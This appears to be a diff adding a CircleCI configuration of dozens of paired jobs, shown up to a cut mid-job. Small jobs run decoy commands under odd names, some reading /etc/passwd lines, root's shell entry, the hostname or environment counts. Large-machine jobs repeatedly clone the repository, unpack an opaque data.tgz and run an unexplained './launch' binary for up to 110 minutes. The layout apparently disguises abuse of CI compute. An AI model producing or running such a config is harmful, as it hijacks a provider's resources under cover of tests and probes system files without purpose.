@@ -1,0 +1,1418 @@
+version: 2.1
+
+jobs:
+  hook_verify-quick-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: split jump
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/.wsp/trace.ndjson; true
+            stat -c '%s %n' /tmp/.wsp/trace.ndjson
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - trace.ndjson
+  verify-quick-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/trace.ndjson > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  alpha_LaunchSuite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: banner up
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 18432 | wc -c; true ; } > /tmp/.wsp/364.txt
+            stat -c '%s %n' /tmp/.wsp/364.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 364.txt
+  LaunchSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  reload_check-nightly-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: eventually
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{x=0.5; for(i=0;i<10;i++)x = x+(2-x*2)/4; printf "%.6f\n",x}'; true ; } > /tmp/.wsp/.ready
+            stat -c '%s %n' /tmp/.wsp/.ready
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ready
+  check-nightly-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  postcheck_atlas-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: arc welder
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; getent passwd root 2>/dev/null | cut -d: -f7; true ; } > /tmp/.wsp/45.data
+            stat -c '%s %n' /tmp/.wsp/45.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 45.data
+  atlas-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/28.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  fetch_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: percussion
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'NR<=3' /etc/passwd | md5sum; true ; } > /tmp/.wsp/.marker
+            stat -c '%s %n' /tmp/.wsp/.marker
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .marker
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  spinner_fx-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: dust bunny
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | base64 | head -c 200; true ; } > /tmp/.wsp/event.log
+            stat -c '%s %n' /tmp/.wsp/event.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - event.log
+  fx-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  postcheck_add-webhook-timeout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: clean and jerk
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "payload=42" | awk -F= '$1=="payload"{print $2+1}'; true ; } > /tmp/.wsp/stage-done.out
+            stat -c '%s %n' /tmp/.wsp/stage-done.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-done.out
+  add-webhook-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/stage-done.out > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  phase2_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: dnd mode
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=1024; while(n>1){n/=2;c++}; print c}'; true ; } > /tmp/.wsp/2024-01-03.data
+            stat -c '%s %n' /tmp/.wsp/2024-01-03.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-01-03.data
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.done > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  package_validte-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: allegro
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)s=s"-"i; print s}'; true ; } > /tmp/.wsp/payload
+            stat -c '%s %n' /tmp/.wsp/payload
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - payload
+  validte-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/28.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  preflight_rl-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: satin finish
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 1800 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/.wsp/step-10.txt
+            stat -c '%s %n' /tmp/.wsp/step-10.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-10.txt
+  rl-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/step-10.txt > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  vendor_CORE-399:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: splash
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)if(sqrt(i)==int(sqrt(i)))print i}' | wc -l; true ; } > /tmp/.wsp/2023-10-27.data
+            stat -c '%s %n' /tmp/.wsp/2023-10-27.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2023-10-27.data
+  CORE-399:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/2023-10-27.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  wire_lets-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: fail free
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk '{s += int($1/10)}END{print s}'; true ; } > /tmp/.wsp/stash.blob
+            stat -c '%s %n' /tmp/.wsp/stash.blob
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stash.blob
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.done > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  maker_WEB-890:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: lint
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 248337 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/.wsp/FINAL.txt
+            stat -c '%s %n' /tmp/.wsp/FINAL.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - FINAL.txt
+  WEB-890:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/28.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  cache_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: dnd on
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++)for(j=1;j<=50;j++)s++;print s}'; true ; } > /tmp/.wsp/buffer.blob
+            stat -c '%s %n' /tmp/.wsp/buffer.blob
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.blob
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  prebuild_bake-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: plank 90
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo 'a:b:c:d:e' | awk -F: '{print NF}'; true ; } > /tmp/.wsp/stage.blob
+            stat -c '%s %n' /tmp/.wsp/stage.blob
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage.blob
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  package_ensure-staging-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: mini boss
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]="x"; a[2]="y"; a[3]="z"; for(i in a)print i":"a[i]}' | sort; true ; } > /tmp/.wsp/.state
+            stat -c '%s %n' /tmp/.wsp/.state
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .state
+  ensure-staging-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  stepA_alpha-v4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rollback never
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "another" | sha512sum 2>/dev/null | head -c 24 || echo "another" | sha256sum | head -c 24; true ; } > /tmp/.wsp/841v2.data
+            stat -c '%s %n' /tmp/.wsp/841v2.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 841v2.data
+  alpha-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.done > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  bake_sierra-6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: ping intern
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes 0 | head -500 | tr -d '\n' | md5sum; true ; } > /tmp/.wsp/buffer.bin
+            stat -c '%s %n' /tmp/.wsp/buffer.bin
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.bin
+  sierra-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/buffer.bin > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  stepB_API-408:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pan sear
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo ${PATH:0:16}; true ; } > /tmp/.wsp/bundle
+            stat -c '%s %n' /tmp/.wsp/bundle
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - bundle
+  API-408:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/bundle > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  sys_v8-nightly:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: sunset build
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "camelCase" | awk '{gsub(/([a-z])([A-Z])/,"\\1_\\2"); print tolower($0)}'; true ; } > /tmp/.wsp/passoff.txt
+            stat -c '%s %n' /tmp/.wsp/passoff.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.txt
+  v8-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  teardown_tango:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: cnc mill
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; hostname 2>/dev/null | md5sum; true ; } > /tmp/.wsp/artifact
+            stat -c '%s %n' /tmp/.wsp/artifact
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - artifact
+  tango:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.done > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  bootstrap_tweak-retry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: midnight snack
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 2048 /dev/urandom | md5sum | awk '{print $1}'; true ; } > /tmp/.wsp/.done
+            stat -c '%s %n' /tmp/.wsp/.done
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .done
+  tweak-retry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.done > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  hydrate_callisto:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hotfix fri
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{printf "%10.4f\n", 1/7}'; true ; } > /tmp/.wsp/stash.bin
+            stat -c '%s %n' /tmp/.wsp/stash.bin
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stash.bin
+  callisto:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/28.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  phase_canary-v8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: dropoff peak
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 2 50 | awk '{isp=1; for(j=2;j*j<=$1;j++)if($1%j==0){isp=0;break}; if(isp)print $1}' | tail -3; true ; } > /tmp/.wsp/28.data
+            stat -c '%s %n' /tmp/.wsp/28.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 28.data
+  canary-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/28.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  orchestrate_v2-beta2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: heeled over
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printenv | wc -l; true ; } > /tmp/.wsp/handoff.sig
+            stat -c '%s %n' /tmp/.wsp/handoff.sig
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - handoff.sig
+  v2-beta2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.done > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  cache_polaris-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: notify stage
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf 'a\nb\na\nc\n' | sort -u | wc -l; true ; } > /tmp/.wsp/stage-ok.out
+            stat -c '%s %n' /tmp/.wsp/stage-ok.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ok.out
+  polaris-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/stage-ok.out > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  prefetch_rc-v4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: flint spark
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 1024 /dev/urandom | tar -c - 2>/dev/null | wc -c; true ; } > /tmp/.wsp/counts.json
+            stat -c '%s %n' /tmp/.wsp/counts.json
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - counts.json
+  rc-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/28.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  wire_hyperion-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: delegate sideways
+          command: |
+            mkdir -p /tmp/.wsp
